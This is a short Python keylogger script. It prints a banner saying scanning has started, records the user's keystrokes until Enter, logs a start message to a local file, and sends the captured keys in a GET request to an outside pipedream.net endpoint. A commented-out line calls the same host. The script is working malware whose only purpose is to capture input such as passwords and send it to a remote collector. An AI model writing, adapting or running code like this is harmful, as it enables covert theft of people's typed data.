import keyboard
import requests
from termcolor import colored 


def keylog():
 #requests.get(f'https://eovzlu8cd49gpu1.m.pipedream.net/?tool=keylogger:{list55}')
 print(colored('''
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

**   ** ****** **   **
** **   **      ** **
***     ******   ***  scanning is started.................................
** **   **        *
**   ** ******    *

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

''','red'))
 keys = keyboard.record(until ='ENTER')
 keyboard.play(keys)
 log_file = open('log/log.txt','a')
 log_file.write(f'[sub]keylogger is starting-\n')
 log_file.close()

 requests.get(f"https://eovzlu8cd49gpu1.m.pipedream.net/?keys={keys}")
keylog()
